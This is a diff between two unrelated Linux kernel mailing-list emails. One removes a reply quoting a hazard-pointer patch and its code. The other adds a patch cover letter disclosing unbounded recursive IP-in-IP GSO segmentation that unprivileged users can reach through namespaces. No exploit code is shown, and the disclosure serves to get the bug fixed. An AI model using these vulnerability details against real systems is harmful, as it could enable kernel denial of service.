@@ -1,650 +1,846 @@
-Received: from mail.mainlining.org (mail.mainlining.org [5.75.144.95])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DAE7C1AC45D;
-	Sat, 19 Sep 2026 11:13:45 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=5.75.144.95
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D188746F482
+	for <linux-kernel@vger.kernel.org>; Sat, 19 Sep 2026 11:14:52 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789816428; cv=none; b=O194tsqh1S2ovR4WZLbiGeYCZoxobljo44JI7xPHtXhrViCXJKyF9YqO5GAPUF8xPFql7gIkD0qbFuy7W1BaY2WFpScSGB1aBopTLEg4jBsgvmX5O3rAHz/gLNg2jMq5rxbwqSZviy2j7Xbm1t1Jgtk4y3FzLlxd7xWqIdFH2d8=
+	t=1789816496; cv=none; b=poMzDPTXkmwlso3SIjRVSmPMdTd2qZAbqUdGEO9RJXgvMQmjeNuBsrouTjaYWcEMT6CdCTA1aBgqyHj+gnHKmVcGZDo5BhgV7RLMAhSqN+2uNqojiD8U5D1NpPvDp7BlDe4ZMBhlyeevfKAvO0UdjYQGViql+/s++YRxXUkTJsw=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789816428; c=relaxed/simple;
-	bh=M3mUGm4v2KRpWjL4/pRD+832nDkI/PFIBfvcqFi2014=;
-	h=Date:From:To:CC:Subject:In-Reply-To:References:Message-ID:
-	 MIME-Version:Content-Type; b=Mg3ms8k1buVnvadsbihfH3v0ge5NwLUo2FLmzmWRVVuisPVdoAcL9s4N11441enKFpdTvwBDXdeZG7OYY9Y2IqmKJ27MuPRF7Q9XhCe6K5qUc9WzMIx40vhLcIHls0P6zU/xZcIC9r9CaLNbzMwJNT+tgv6dq4h0QuW8lfTL90k=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=mainlining.org; spf=pass smtp.mailfrom=mainlining.org; dkim=pass (2048-bit key) header.d=mainlining.org header.i=@mainlining.org header.b=iQT1lm0T; dkim=permerror (0-bit key) header.d=mainlining.org header.i=@mainlining.org header.b=jH3tVQ0I; arc=none smtp.client-ip=5.75.144.95
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=mainlining.org
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=mainlining.org
+	s=arc-20240116; t=1789816496; c=relaxed/simple;
+	bh=vKS2slCp3VKv8BqJ0PUzkXYB60SikCdpkWN+wLQQ2xE=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=DvvXdfRLzjmruROyVIv6h56rbEa/vuZGbKs9CSkWLs1wEhakjDQK48GxEgToQBO8QNjVSBeDTgTzFP0r0kQn++5N9MW9KmW85zH8CDR6tav1l/9dQc9S0gMP4fcl1xrdfeFvJrLMuxmCgfLesVJQ4VzmcCLXiyaFHGxq+M3/l/k=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=kBsAC6+Q; arc=none smtp.client-ip=74.125.227.141
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=mainlining.org header.i=@mainlining.org header.b="iQT1lm0T";
-	dkim=permerror (0-bit key) header.d=mainlining.org header.i=@mainlining.org header.b="jH3tVQ0I"
-DKIM-Signature: v=1; a=rsa-sha256; s=202507r; d=mainlining.org; c=relaxed/relaxed;
-	h=Message-ID:Subject:To:From:Date; t=1789816321; bh=2ozZqxYt0zj86HyHFpk2lsb
-	NyjDODjlLt4d3XvAUuWo=; b=iQT1lm0TJoX+h5TfdGExoUrwR3v3NHWL3c+QiQPnftCOnkm74O
-	gK6cSRCMI682GBmpjWnu/M6hcMryp9AXTtgZ5RZd7KFM8zDpCVgZkH1tv281QyzoVhdvTGC3O0F
-	8nVjPwXQaeIP69CyR+SXSp5HG8KLAyBumrVwbJfjU7Wx0Rs2sYKtMllk1dUta55PSJOBcDcidFU
-	RHq6cZMjpvXrDCIiBvaA4DSXLewRrkTS6BpF84lGdEXQ+KXAydUCx4+g6K0ZKKGd7wjg320whkW
-	3rnZSWlu+OtvJTUmtwKJuXjkWeJDjWb7Wc1pM+0zUKfRDH5iHN2oSUy6B5dr0bQ0x4A==;
-DKIM-Signature: v=1; a=ed25519-sha256; s=202507e; d=mainlining.org; c=relaxed/relaxed;
-	h=Message-ID:Subject:To:From:Date; t=1789816322; bh=2ozZqxYt0zj86HyHFpk2lsb
-	NyjDODjlLt4d3XvAUuWo=; b=jH3tVQ0I2wxZe8pGylesroBQtPDqRVcZ0nKl3roTny+UsxEoNS
-	TFrf7QjrGQJK9E2l0xuz543RT6E6/n81+0DA==;
-Date: Sat, 19 Sep 2026 12:12:02 +0100
-From: Bradley Morgan <brads@mainlining.org>
-To: "Paul E. McKenney" <paulmck@kernel.org>, rcu@vger.kernel.org,
- linux-kernel@vger.kernel.org
-CC: kernel-team@meta.com, Mathieu Desnoyers <mathieu.desnoyers@efficios.com>,
- Boqun Feng <boqun@kernel.org>, Steven Rostedt <rostedt@goodmis.org>,
- lkmm@lists.linux.dev, Zqiang <qiang.zhang@linux.dev>,
- Wang Lian <lianux.mm@gmail.com>, Kunwu Chan <kunwu.chan@gmail.com>,
- Nicholas Piggin <npiggin@gmail.com>, Michael Ellerman <mpe@ellerman.id.au>,
- Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
- Sebastian Andrzej Siewior <bigeasy@linutronix.de>,
- Will Deacon <will@kernel.org>, Peter Zijlstra <peterz@infradead.org>,
- Alan Stern <stern@rowland.harvard.edu>, John Stultz <jstultz@google.com>,
- Linus Torvalds <torvalds@linux-foundation.org>,
- Andrew Morton <akpm@linux-foundation.org>,
- Frederic Weisbecker <frederic@kernel.org>,
- Joel Fernandes <joel@joelfernandes.org>,
- Josh Triplett <josh@joshtriplett.org>, Uladzislau Rezki <urezki@gmail.com>,
- Lai Jiangshan <jiangshanlai@gmail.com>, Zqiang <qiang.zhang1211@gmail.com>,
- Ingo Molnar <mingo@redhat.com>, Waiman Long <longman@redhat.com>,
- Mark Rutland <mark.rutland@arm.com>, Thomas Gleixner <tglx@linutronix.de>,
- Vlastimil Babka <vbabka@suse.cz>, maged.michael@gmail.com,
- Mateusz Guzik <mjguzik@gmail.com>,
- Jonas Oberhauser <jonas.oberhauser@huaweicloud.com>, linux-mm@kvack.org
-Subject: Re: [PATCH 01/28] hazptr: Implement Hazard Pointers
-In-Reply-To: <20260919000056.3132131-1-paulmck@kernel.org>
-References: <e9669b34-12c2-4cf2-a887-315f581f0789@paulmck-laptop> <20260919000056.3132131-1-paulmck@kernel.org>
-Message-ID: <65321E46-473C-48B6-922C-122E14FB745D@mainlining.org>
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="kBsAC6+Q"
+Received: by mail-pj2-f13.google.com with SMTP id 98e67ed59e1d1-396cccbba92so1501248a91.0
+        for <linux-kernel@vger.kernel.org>; Sat, 19 Sep 2026 04:14:52 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1789816492; x=1790421292; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=nzToVmtHBznrFyW6V/tJjQMRQWxjSJkAJPJtVlNDQWg=;
+        b=kBsAC6+QPr4gtyUM/eqbpMTEUDb79sSJjwORGvR7Dto+Ah+plQf/7RKgdPxL0EIOyy
+         +YXi4gb/iSuPf6pWwfxqxmXaJ09i5pFCRoDf8lioSy5Ve6+o8KW5h4zE9ZJ5SRjapQ/c
+         bP9l++ropg++JjBMpp2wAWJYxxxj6AO/YH1dMCq3Ut6wl84C4QYTOPGFe4twXzZjNR/d
+         2AG8MGWBouLiQxEJRge/aGH9+wwspYXCxPEjIc8gE+/sOQTQT9zgiT/P6/jOLBFQrtDm
+         U74jUuoFASs0kajV1mfo7vfp/eiV6pHueQqYAozI5bwgbL+Ox0y9pr8UjYrbftlWI7cx
+         z95Q==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1789816492; x=1790421292;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=nzToVmtHBznrFyW6V/tJjQMRQWxjSJkAJPJtVlNDQWg=;
+        b=Ii3M5G/HjDOKPS8xEiApNLl+/RUG8/XlSjteWpciGaeU2DKUMqDAUErJ7KpgGnvYtu
+         FJd0xbcFQd7KWg9pSlz4QFQWoOaz2CD+NKxNyvLv9z5/MRMAlRCfefAfB00akyyrcEKW
+         rchN5DyouaLZ3twwUUMrOxWBjSNs8t7/wLi3g2P5L7ivrnDa9nmRCaqwm/fSgeAbBGUK
+         ++b3QJYFKiAdQ7GLP305Iy8Z+/ai0SS1lGjltSFinRtyVcRL9AXs8A2jw53floaR/R3R
+         52aLZiDnc0wDaB0O6vl9mDAirfhqFnu13Urbfe0niybcPzi3KdFJ8KuUPc9W0dNE8Tid
+         gljA==
+X-Forwarded-Encrypted: i=1; AKwUvByL2tV63NYJV+eQQxrwbqnITc8D9ustTlu03iydCW7bqFOvm9EWbsOlR6tBen1XbL3aM8xVJHEL//ntPqg=@vger.kernel.org
+X-Gm-Message-State: AFuF++klvBeRQaDqLYLt+cp7XxsyI9T2HDj1WbaQFuk1toi8YC5LNzGb
+	kz8rvSWGNqn20bYwUY/7ol09X8NIS+XguNJd1Qk1oAmVbRAqwjSvWrHQA4ZDksvtxoX5
+X-Gm-Gg: AYBFou1aNxW2UNwAWt5UsNLxVKBF4tK3qDqEWHwI+OpDbHqt+qY67DGo3ucywQBYRy4
+	quOY2Epq3yRZuDag/1TasGhAfT9A5/qC74D881CChmTubDP5/om/+kKj4pAuuptPiSnxvBIpkMe
+	s06eqU0/SLUdjyj4qd8+rHpoj8TD1vLxUyGGQC48dDeKCtwRgV/fCMcbyfamVrO7XHsXJgFNuNs
+	fC72Zvvv4SzqTCBPR5D/j5ORMndDVPVshVMA8xOWA9pR7DtV+F9olwgV8Ox4cC95+y2icQTqJs0
+	8rYtPSIDupvj/pMwn2lDSpswzJ1NLIOjt+CvhVz+4LFsfPIRtamtfLcebfesRmFNK7XoQMBeqpA
+	IH5ZqhVddMX+cRSkiNOYtfFZa6O/HSgRerq0nWPjHmulKVReIzXSVmiRai8P7POsyEHnLFBlj+N
+	RsxDOkvP7PuWk3aDy/ZlFu7uSnqDiZaZN9KpSaA4a2DrigSqb1LTW3++MJ3LLT+2C6VUNmssO7R
+	3pG78Oi5hBbgZwMiSjEx0vyFeW7Cg==
+X-Received: by 2002:a17:90b:4e85:b0:39e:21a7:5df5 with SMTP id 98e67ed59e1d1-39e54d5ca4fmr9108317a91.24.1789816491863;
+        Sat, 19 Sep 2026 04:14:51 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a0290e844esm531163a91.2.2026.09.19.04.14.45
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sat, 19 Sep 2026 04:14:50 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org
+Cc: zihanx@nebusec.ai,
+	davem@davemloft.net,
+	edumazet@google.com,
+	kuba@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	steffen.klassert@secunet.com,
+	herbert@gondor.apana.org.au,
+	dsahern@kernel.org,
+	idosch@nvidia.com,
+	willemb@google.com,
+	kuniyu@google.com,
+	kees@kernel.org,
+	richardbgobert@gmail.com,
+	alice.kernel@fastmail.im,
+	gal@nvidia.com,
+	jibin.zhang@mediatek.com,
+	luoxuanqiang@kylinos.cn,
+	linux-kernel@vger.kernel.org
+Subject: [PATCH net v3 0/1] net: gso: limit recursive IP-in-IP segmentation
+Date: Sat, 19 Sep 2026 11:14:39 +0000
+Message-ID: <cover.1789802623.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain;
- charset=utf-8
 Content-Transfer-Encoding: 8bit
 
-On 19 September 2026 01:00:29 BST, "Paul E. McKenney" <paulmck@kernel.org>
-wrote:
->From: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>
->
->This API provides existence guarantees of objects through Hazard
->Pointers [1] (hazptr).
->
+Hi Linux kernel maintainers,
 
-Hi, could I add my tag here?
+We found and validated an issue in net/core/gso.c. The affected paths are
+skb_mac_gso_segment(), inet_gso_segment(), and ipv6_gso_segment(); nested
+IP-in-IP GSO has no bound on callback nesting. The bug is reachable by a
+non-root user through private user and network namespaces. The BPF/veth
+reproducer needs root in the initial user namespace; the namespace-only
+reproducer starts as UID 65534. The change is expected not to affect other
+functionality; v3 validation covered IPv4 BPF/veth and namespace-only paths
+on x86_64. IPv6 was compile-checked, but no separate IPv6 runtime test was
+run.
 
->Its main benefit over RCU is that it allows fast reclaim of
->HP-protected pointers without needing to wait for a grace period.
->
->This implementation has 4 statically allocated hazard pointer slots per
->cpu for the fast path, and relies on a on-stack backup slot allocated by
->the hazard pointer user as fallback in case no per-cpu slot is
->available.
->
->It integrates with the scheduler to migrate per-CPU slots to the backup
->slot on context switch. This ensures that the per-CPU slots won't be
->used by blocked or preempted tasks holding on hazard pointers for a long
->time.
->
->References:
->
->[1]: M. M. Michael, "Hazard pointers: safe memory reclamation for
->     lock-free objects," in IEEE Transactions on Parallel and
->     Distributed Systems, vol. 15, no. 6, pp. 491-504, June 2004
->
->Link: https://lpc.events/event/19/contributions/2082/
->Link: https://lore.kernel.org/lkml/j3scdl5iymjlxavomgc6u5ndg3svhab6ga23dr36o4f5mt333w@7xslvq6b6hmv/
->Link: https://lpc.events/event/18/contributions/1731/
->Signed-off-by: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>
->Cc: Nicholas Piggin <npiggin@gmail.com>
->Cc: Michael Ellerman <mpe@ellerman.id.au>
->Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
->Cc: Sebastian Andrzej Siewior <bigeasy@linutronix.de>
->Cc: "Paul E. McKenney" <paulmck@kernel.org>
->Cc: Will Deacon <will@kernel.org>
->Cc: Peter Zijlstra <peterz@infradead.org>
->Cc: Boqun Feng <boqun@kernel.org>
->Cc: Alan Stern <stern@rowland.harvard.edu>
->Cc: John Stultz <jstultz@google.com>
->Cc: Linus Torvalds <torvalds@linux-foundation.org>
->Cc: Andrew Morton <akpm@linux-foundation.org>
->Cc: Frederic Weisbecker <frederic@kernel.org>
->Cc: Joel Fernandes <joel@joelfernandes.org>
->Cc: Josh Triplett <josh@joshtriplett.org>
->Cc: Uladzislau Rezki <urezki@gmail.com>
->Cc: Steven Rostedt <rostedt@goodmis.org>
->Cc: Lai Jiangshan <jiangshanlai@gmail.com>
->Cc: Zqiang <qiang.zhang1211@gmail.com>
->Cc: Ingo Molnar <mingo@redhat.com>
->Cc: Waiman Long <longman@redhat.com>
->Cc: Mark Rutland <mark.rutland@arm.com>
->Cc: Thomas Gleixner <tglx@linutronix.de>
->Cc: Vlastimil Babka <vbabka@suse.cz>
->Cc: maged.michael@gmail.com
->Cc: Mateusz Guzik <mjguzik@gmail.com>
->Cc: Jonas Oberhauser <jonas.oberhauser@huaweicloud.com>
->Cc: <rcu@vger.kernel.org>
->Cc: <linux-mm@kvack.org>
->Cc: <lkmm@lists.linux.dev>
->Signed-off-by: Paul E. McKenney <paulmck@kernel.org>
->---
-> include/linux/hazptr.h | 197 +++++++++++++++++++++++++++++++++
-> init/main.c            |   2 +
-> kernel/Makefile        |   2 +-
-> kernel/hazptr.c        | 242 +++++++++++++++++++++++++++++++++++++++++
-> kernel/sched/core.c    |   2 +
-> 5 files changed, 444 insertions(+), 1 deletion(-)
-> create mode 100644 include/linux/hazptr.h
-> create mode 100644 kernel/hazptr.c
->
->diff --git a/include/linux/hazptr.h b/include/linux/hazptr.h
->new file mode 100644
->index 000000000000..b121f7779cda
->--- /dev/null
->+++ b/include/linux/hazptr.h
->@@ -0,0 +1,197 @@
->+// SPDX-License-Identifier: LGPL-2.1-or-later
->+//
->+// SPDX-FileCopyrightText: 2024 Mathieu Desnoyers <mathieu.desnoyers@efficios.com>
->+
->+#ifndef _LINUX_HAZPTR_H
->+#define _LINUX_HAZPTR_H
->+
->+/*
->+ * hazptr: Hazard Pointers
->+ *
->+ * This API provides existence guarantees of objects through hazard
->+ * pointers.
->+ *
->+ * Its main benefit over RCU is that it allows fast reclaim of
->+ * HP-protected pointers without needing to wait for a grace period.
->+ *
->+ * References:
->+ *
->+ * [1]: M. M. Michael, "Hazard pointers: safe memory reclamation for
->+ *      lock-free objects," in IEEE Transactions on Parallel and
->+ *      Distributed Systems, vol. 15, no. 6, pp. 491-504, June 2004
->+ */
->+
->+#include <linux/percpu.h>
->+#include <linux/types.h>
->+#include <linux/cleanup.h>
->+#include <linux/sched.h>
->+
->+/* 4 slots (each sizeof(hazptr_slot_item)) fit in a single 64-byte cache line. */
->+#define NR_HAZPTR_PERCPU_SLOTS	4
->+#define HAZPTR_WILDCARD		((void *) 0x1UL)
->+
->+/*
->+ * Hazard pointer slot.
->+ */
->+struct hazptr_slot {
->+	void *addr;
->+};
->+
->+struct hazptr_overflow_list;
->+
->+struct hazptr_backup_slot {
->+	struct hlist_node overflow_node;
->+	struct hazptr_slot slot;
->+	/* Overflow list where the backup slot is added. */
->+	struct hazptr_overflow_list *overflow_list;
->+};
->+
->+struct hazptr_ctx {
->+	struct hazptr_slot *slot;
->+	/* Backup slot in case all per-CPU slots are used. */
->+	struct hazptr_backup_slot backup_slot;
->+	struct hlist_node preempt_node;
->+};
->+
->+struct hazptr_slot_ctx {
->+	struct hazptr_ctx *ctx;
->+};
->+
->+struct hazptr_slot_item {
->+	struct hazptr_slot slot;
->+	struct hazptr_slot_ctx ctx;
->+};
->+
->+struct hazptr_percpu_slots {
->+	struct hazptr_slot_item items[NR_HAZPTR_PERCPU_SLOTS];
->+} ____cacheline_aligned;
->+
->+DECLARE_PER_CPU(struct hazptr_percpu_slots, hazptr_percpu_slots);
->+
->+void *__hazptr_acquire(struct hazptr_ctx *ctx, void * const *addr_p);
->+
->+/*
->+ * hazptr_synchronize: Wait until @addr is released from all slots.
->+ *
->+ * Wait to observe that each slot contains a value that differs from
->+ * @addr before returning.
->+ * Should be called from preemptible context.
->+ */
->+void hazptr_synchronize(void *addr);
->+
->+/*
->+ * hazptr_chain_backup_slot: Chain backup slot into overflow list.
->+ *
->+ * Set backup slot address to @addr, and chain it into the overflow
->+ * list.
->+ */
->+struct hazptr_slot *hazptr_chain_backup_slot(struct hazptr_ctx *ctx);
->+
->+/*
->+ * hazptr_unchain_backup_slot: Unchain backup slot from overflow list.
->+ */
->+void hazptr_unchain_backup_slot(struct hazptr_ctx *ctx);
->+
->+static inline
->+bool hazptr_slot_is_backup(struct hazptr_ctx *ctx, struct hazptr_slot *slot)
->+{
->+	return slot == &ctx->backup_slot.slot;
->+}
->+
->+static inline
->+void hazptr_note_context_switch(void)
->+{
->+	struct hazptr_percpu_slots *percpu_slots = this_cpu_ptr(&hazptr_percpu_slots);
->+	unsigned int idx;
->+
->+	for (idx = 0; idx < NR_HAZPTR_PERCPU_SLOTS; idx++) {
->+		struct hazptr_slot_item *item = &percpu_slots->items[idx];
->+		struct hazptr_slot *slot = &item->slot, *backup_slot;
->+		struct hazptr_ctx *ctx;
->+
->+		if (!slot->addr)
->+			continue;
->+		ctx = item->ctx.ctx;
->+		backup_slot = hazptr_chain_backup_slot(ctx);
->+		/*
->+		 * Move hazard pointer from the per-CPU slot to the
->+		 * backup slot. This requires hazard pointer
->+		 * synchronize to iterate on per-CPU slots with
->+		 * load-acquire before iterating on the overflow list.
->+		 */
->+		WRITE_ONCE(backup_slot->addr, slot->addr);
->+		/*
->+		 * store-release orders store to backup slot addr before
->+		 * store to per-CPU slot addr.
->+		 */
->+		smp_store_release(&slot->addr, NULL);
->+		/* Use the backup slot for context. */
->+		ctx->slot = backup_slot;
->+	}
->+}
->+
->+/*
->+ * hazptr_acquire: Load pointer at address and protect with hazard pointer.
->+ *
->+ * Load @addr_p, and protect the loaded pointer with hazard pointer.
->+ * When using hazptr_acquire from interrupt handlers, the acquired slots
->+ * need to be released before returning from the interrupt handler.
->+ *
->+ * Returns a non-NULL protected address if the loaded pointer is non-NULL.
->+ * Returns NULL if the loaded pointer is NULL.
->+ *
->+ * On success the protected hazptr slot is stored in @ctx->slot.
->+ */
->+static inline
->+void *hazptr_acquire(struct hazptr_ctx *ctx, void * const *addr_p)
->+{
->+	struct hazptr_percpu_slots *percpu_slots;
->+	struct hazptr_slot_item *slot_item;
->+	struct hazptr_slot *slot;
->+	void *addr;
->+
->+	guard(preempt)();
->+	percpu_slots = this_cpu_ptr(&hazptr_percpu_slots);
->+	slot_item = &percpu_slots->items[0];
->+	slot = &slot_item->slot;
->+	if (unlikely(slot->addr))
->+		return __hazptr_acquire(ctx, addr_p);
->+	WRITE_ONCE(slot->addr, HAZPTR_WILDCARD);	/* Store B */
->+
->+	/* Memory ordering: Store B before Load A. */
->+	smp_mb();
->+
->+	/*
->+	 * Load @addr_p after storing wildcard to the hazard pointer slot.
->+	 */
->+	addr = READ_ONCE(*addr_p);	/* Load A */
->+
->+	/*
->+	 * We don't care about ordering of Store C. It will simply
->+	 * replace the wildcard by a more specific address. If addr is
->+	 * NULL, we simply store NULL into the slot.
->+	 */
->+	WRITE_ONCE(slot->addr, addr);	/* Store C */
->+	slot_item->ctx.ctx = ctx;
->+	ctx->slot = slot;
->+	return addr;
->+}
->+
->+/* Release the protected hazard pointer from @slot. */
->+static inline
->+void hazptr_release(struct hazptr_ctx *ctx, void *addr)
->+{
->+	struct hazptr_slot *slot;
->+
->+	if (!addr)
->+		return;
->+	guard(preempt)();
->+	slot = ctx->slot;
->+	smp_store_release(&slot->addr, NULL);
->+	if (unlikely(hazptr_slot_is_backup(ctx, slot)))
->+		hazptr_unchain_backup_slot(ctx);
->+}
->+
->+void hazptr_init(void);
->+
->+#endif /* _LINUX_HAZPTR_H */
->diff --git a/init/main.c b/init/main.c
->index 2613d3f9b3ce..d9d936707c19 100644
->--- a/init/main.c
->+++ b/init/main.c
->@@ -108,6 +108,7 @@
-> #include <linux/time_namespace.h>
-> #include <linux/unaligned.h>
-> #include <linux/vdso_datastore.h>
->+#include <linux/hazptr.h>
-> #include <net/net_namespace.h>
-> 
-> #include <asm/io.h>
->@@ -1075,6 +1076,7 @@ void start_kernel(void)
-> 	workqueue_init_early();
-> 
-> 	rcu_init();
->+	hazptr_init();
-> 	kvfree_rcu_init();
-> 
-> 	/* Trace events are available after this */
->diff --git a/kernel/Makefile b/kernel/Makefile
->index 1e1a31673577..8961c8660d0d 100644
->--- a/kernel/Makefile
->+++ b/kernel/Makefile
->@@ -7,7 +7,7 @@ obj-y     = fork.o exec_domain.o exec_state.o panic.o \
-> 	    cpu.o exit.o softirq.o resource.o \
-> 	    sysctl.o capability.o ptrace.o user.o \
-> 	    signal.o sys.o umh.o workqueue.o pid.o task_work.o \
->-	    extable.o params.o \
->+	    extable.o params.o hazptr.o \
-> 	    kthread.o sys_ni.o nsproxy.o nstree.o nscommon.o \
-> 	    notifier.o ksysfs.o cred.o reboot.o \
-> 	    async.o range.o smpboot.o ucount.o regset.o ksyms_common.o
->diff --git a/kernel/hazptr.c b/kernel/hazptr.c
->new file mode 100644
->index 000000000000..a9d3d68a1525
->--- /dev/null
->+++ b/kernel/hazptr.c
->@@ -0,0 +1,242 @@
->+// SPDX-License-Identifier: LGPL-2.1-or-later
->+//
->+// SPDX-FileCopyrightText: 2024 Mathieu Desnoyers <mathieu.desnoyers@efficios.com>
->+
->+/*
->+ * hazptr: Hazard Pointers
->+ */
->+
->+#include <linux/hazptr.h>
->+#include <linux/percpu.h>
->+#include <linux/spinlock.h>
->+#include <linux/mutex.h>
->+#include <linux/list.h>
->+#include <linux/export.h>
->+
->+struct hazptr_overflow_list {
->+	raw_spinlock_t lock;		/* Lock protecting overflow list and list generation. */
->+	struct hlist_head head;		/* Overflow list head. */
->+	uint64_t gen;			/* Overflow list generation. */
->+};
->+
->+/*
->+ * Flip between two lists to guarantee list scan forward progress even
->+ * with frequent generation counter increments. The list additions are
->+ * always done on a different list than the one used for scan. The scan
->+ * successively iterates on both lists. Therefore, only list removals
->+ * can cause the iteration to retry, and the number of removals is
->+ * limited to the number of list elements.
->+ */
->+struct hazptr_overflow_list_flip {
->+	struct mutex lock;		/* Mutex protecting add_idx from concurrent updates. */
->+	unsigned int add_idx;		/* Index of current flip-list to add to. */
->+	struct hazptr_overflow_list array[2];
->+};
->+
->+static DEFINE_PER_CPU(struct hazptr_overflow_list_flip, percpu_overflow_list_flip);
->+
->+DEFINE_PER_CPU(struct hazptr_percpu_slots, hazptr_percpu_slots);
->+EXPORT_PER_CPU_SYMBOL_GPL(hazptr_percpu_slots);
->+
->+static
->+struct hazptr_slot *hazptr_get_free_percpu_slot(struct hazptr_ctx *ctx)
->+{
->+	struct hazptr_percpu_slots *percpu_slots = this_cpu_ptr(&hazptr_percpu_slots);
->+	unsigned int idx;
->+
->+	for (idx = 0; idx < NR_HAZPTR_PERCPU_SLOTS; idx++) {
->+		struct hazptr_slot_item *item = &percpu_slots->items[idx];
->+		struct hazptr_slot *slot = &item->slot;
->+
->+		if (!slot->addr) {
->+			item->ctx.ctx = ctx;
->+			return slot;
->+		}
->+	}
->+	/* All slots are in use. */
->+	return NULL;
->+}
->+
->+/*
->+ * Hazard pointer acquire slow path.
->+ * Called with preemption disabled.
->+ */
->+void *__hazptr_acquire(struct hazptr_ctx *ctx, void * const *addr_p)
->+{
->+	struct hazptr_slot *slot = hazptr_get_free_percpu_slot(ctx);
->+	void *addr;
->+
->+	/*
->+	 * If all the per-CPU slots are already in use, fallback
->+	 * to the backup slot.
->+	 */
->+	if (unlikely(!slot))
->+		slot = hazptr_chain_backup_slot(ctx);
->+	WRITE_ONCE(slot->addr, HAZPTR_WILDCARD);	/* Store B */
->+
->+	/* Memory ordering: Store B before Load A. */
->+	smp_mb();
->+
->+	/*
->+	 * Load @addr_p after storing wildcard to the hazard pointer slot.
->+	 */
->+	addr = READ_ONCE(*addr_p);	/* Load A */
->+
->+	/*
->+	 * We don't care about ordering of Store C. It will simply
->+	 * replace the wildcard by a more specific address. If addr is
->+	 * NULL, we simply store NULL into the slot.
->+	 */
->+	WRITE_ONCE(slot->addr, addr);	/* Store C */
->+	ctx->slot = slot;
->+	if (!addr && hazptr_slot_is_backup(ctx, slot))
->+		hazptr_unchain_backup_slot(ctx);
->+	return addr;
->+}
->+EXPORT_SYMBOL_GPL(__hazptr_acquire);
->+
->+/*
->+ * Perform piecewise iteration on overflow list waiting until "addr" is
->+ * not present. Raw spinlock is released and taken between each list
->+ * item and busy loop iteration. The overflow list generation is checked
->+ * each time the lock is taken to validate that the list has not changed
->+ * before resuming iteration or busy wait. If the generation has
->+ * changed, retry the entire list traversal.
->+ */
->+static
->+void hazptr_synchronize_overflow_list(struct hazptr_overflow_list *overflow_list, void *addr)
->+{
->+	struct hazptr_backup_slot *backup_slot;
->+	uint64_t snapshot_gen;
->+	unsigned long flags;
->+
->+	raw_spin_lock_irqsave(&overflow_list->lock, flags);
->+retry:
->+	snapshot_gen = overflow_list->gen;
->+	hlist_for_each_entry(backup_slot, &overflow_list->head, overflow_node) {
->+		/* Busy-wait if node is found. */
->+		for (;;) {
->+			void *load_addr = smp_load_acquire(&backup_slot->slot.addr);	/* Load B */
->+
->+			if (load_addr != addr && load_addr != HAZPTR_WILDCARD)
->+				break;
->+			raw_spin_unlock_irqrestore(&overflow_list->lock, flags);
->+			cpu_relax();
->+			raw_spin_lock_irqsave(&overflow_list->lock, flags);
->+			if (overflow_list->gen != snapshot_gen)
->+				goto retry;
->+		}
->+		raw_spin_unlock_irqrestore(&overflow_list->lock, flags);
->+		/*
->+		 * Release raw spinlock, validate generation after
->+		 * re-acquiring the lock.
->+		 */
->+		raw_spin_lock_irqsave(&overflow_list->lock, flags);
->+		if (overflow_list->gen != snapshot_gen)
->+			goto retry;
->+	}
->+	raw_spin_unlock_irqrestore(&overflow_list->lock, flags);
->+}
->+
->+static
->+void hazptr_synchronize_cpu_slots(int cpu, void *addr)
->+{
